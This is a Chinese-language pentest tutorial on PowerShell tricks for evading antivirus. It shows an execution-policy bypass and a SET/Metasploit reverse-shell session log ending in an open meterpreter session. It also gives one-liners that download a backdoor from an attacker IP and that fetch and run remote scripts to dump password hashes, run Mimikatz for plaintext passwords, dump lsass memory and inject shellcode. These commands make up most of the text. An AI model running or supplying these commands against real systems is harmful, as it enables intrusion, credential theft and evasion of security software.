# Powershell tricks::Bypass AV

0x00 Powershell 简介
------------------

* * *

Powershell犹如linux下的bash，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 Powershell强大的功能特性给windows管理带来了极大的便利，同时也更加便于windows下的渗透测试。

0x01 PowerShell Execution Policy
--------------------------------

* * *

Powershell脚本默认情况下无法双击或在cmd下执行。在执行时需要通过一些方法绕过该策略。 最简单的方法就是执行powershell.exe附加需要执行的命令，也可以将要执行的脚本直接复制进powershell的窗口。 当然也可以`Download and execute`，如下面示例中一样。

如果需要执行ps1文件时，也可以这样：

```
PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1

```

不建议使用其他方法全局改变执行策略，如果场景不同可以根据[参考](https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy)自行选择执行方式。

0x02 Reverse the Shell
----------------------

* * *

在遇到防护软件时，可以使用powershell执行shellcode返回shell。执行脚本可以用msf生成，也可以用set工具包生成，注意的是msf生成的ps1文件，而set生成的是bat文件。 下面是在set中生成的过程：

```
Select from the menu:

   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
   4) Update the Metasploit Framework
   5) Update the Social-Engineer Toolkit
   6) Update SET configuration
   7) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 1

..SNIP...

 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) SMS Spoofing Attack Vector
   8) Wireless Access Point Attack Vector
   9) QRCode Generator Attack Vector
  10) Powershell Attack Vectors
  11) Third Party Modules

  99) Return back to the main menu.

set> 10

The Powershell Attack Vector module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape for deploying payloads and performing functions that  do not get triggered by preventative technologies.

   1) Powershell Alphanumeric Shellcode Injector
   2) Powershell Reverse Shell
   3) Powershell Bind Shell
   4) Powershell Dump SAM Database

  99) Return to Main Menu

set:powershell>1
set> IP address for the payload listener: 192.168.200.159
set:powershell> Enter the port for the reverse [443]:4444
[*] Prepping the payload for delivery and injecting alphanumeric shellcode...
[*] Generating x86-based powershell injection code...
[*] Finished generating powershell injection bypass.
[*] Encoded to bypass execution restriction policy...
[*] If you want the powershell commands and attack, they are exported to /root/.set/reports/powershell/
set> Do you want to start the listener now [yes/no]: : yes

..SNIP...

[*] Processing /root/.set/reports/powershell/powershell.rc for ERB directives.
resource (/root/.set/reports/powershell/powershell.rc)> use multi/handler
resource (/root/.set/reports/powershell/powershell.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (/root/.set/reports/powershell/powershell.rc)> set lport 4444
lport => 4444
resource (/root/.set/reports/powershell/powershell.rc)> set LHOST 0.0.0.0
LHOST => 0.0.0.0
resource (/root/.set/reports/powershell/powershell.rc)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) > 
[*] Started reverse handler on 0.0.0.0:4444 
[*] Starting the payload handler...
[*] Sending stage (769024 bytes) to 192.168.200.158
[*] Meterpreter session 1 opened (192.168.200.159:4444 -> 192.168.200.158:49818) at 2014-10-23 18:17:35 +0800

msf exploit(handler) > sessions 

Active sessions
===============

  Id  Type                   Information                               Connection
  --  ----                   -----------                               ----------
  1   meterpreter x86/win32  WIN-M49V8M0CSH2\server @ WIN-M49V8M0CSH2  192.168.200.159:4444 -> 192.168.200.158:49818 (192.168.200.158)

```

生成的文件在`/root/.set/reports/powershell/`下。 其中`x86_powershell_injection.txt`为bat文件，可以直接改名运行。 在这里有个技巧可以通过powershell一句话直接下载文件。

```
powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.200.159/backdoor','backdoor.bat')

```

![enter image description here](http://drops.javaweb.org/uploads/images/9601b032a5f71a6bd060c1ea5ec49626e6c54617.jpg)

然后再执行就可以得到meterpreter会话了。

![enter image description here](http://drops.javaweb.org/uploads/images/412d2c06b2eca009d09218e435826a9aa109dc71.jpg)

并且可以正常执行cmd命令、dump hash明文等操作。

![enter image description here](http://drops.javaweb.org/uploads/images/730aee5b81772ebc046841fa034402a4b970f2d0.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b2c4139993a9c781d610f9567e7b888ea97ce328.jpg)

0x03 Dump the hash
------------------

* * *

当然在仅仅需要dump hash时，也可以借助powershell来完成。

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes

```

![enter image description here](http://drops.javaweb.org/uploads/images/0329b448b88f9cb67a4406933d28e334056e0223.jpg)

0x04 Dump the plain Password
----------------------------

* * *

同样也可以用下面的方式(执行powershell版的Mimikatz)获取明文。

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts

```

![enter image description here](http://drops.javaweb.org/uploads/images/266f8ea2795b27288e9a4e110f33a186a945e540.jpg)

值得注意的是在这里也可以通过Command参数执行Mimikatz命令。

0x05 Memory Dumping
-------------------

* * *

Powershell也可以完成像procdump一样的工作，获取某个进程的dumps。 这里演示获取lsass.exe的dumps，然后再用Mimikatz从dumps中获取明文。

![enter image description here](http://drops.javaweb.org/uploads/images/bfbdaddf0e0b7c8f67df9529e80b5edc3e05edd3.jpg)

然后将lsass dumps文件下载回来用Mimikatz分析可以得到明文密码。

![enter image description here](http://drops.javaweb.org/uploads/images/afc3f0d8db4ef6e9bb31a384640a702b672cad65.jpg)

当然内存dumps不仅仅可以获取windows密码，往往进程内存中或许会储存其他重要的信息或数据。参考[http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html](http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html)。

0x06 Execute the shellcode
--------------------------

* * *

Powershell由于丰富的扩展功能使得其调用windows API非常方便，所以同样也可以执行shellcode，这一过程如下：

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode –help

```

![enter image description here](http://drops.javaweb.org/uploads/images/7142ad41627a7d65109c0ca2820d669dd0daf13c.jpg)

但是在这里有个问题，就是x64下shellcode已有的很少，往往通过网上搜集的shellcode都是x86的。如果直接执行x86的shellcode则会出错。

不过Invoke-Shellcode.ps1脚本默认是将shellcode注入在powershell.exe进程中，那么便可以用64位系统环境下32位的powershell.exe执行x86的shellcode，过程如下：

```
c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Shellcode 0x90,0x90,0x90 ...

```

![enter image description here](http://drops.javaweb.org/uploads/images/d31b93ca60e786c199af81af9328b56a15bb5dad.jpg)

并且这一过程适用于大部分msfpayload生成的shellcode。当然在windows下执行shellcode也可以用其它的方法，比如[shellcodeexec](https://github.com/inquisb/shellcodeexec)。不过这个方法并不能bypass AV。但是大家可以根据源码自行bypass。

未完待续。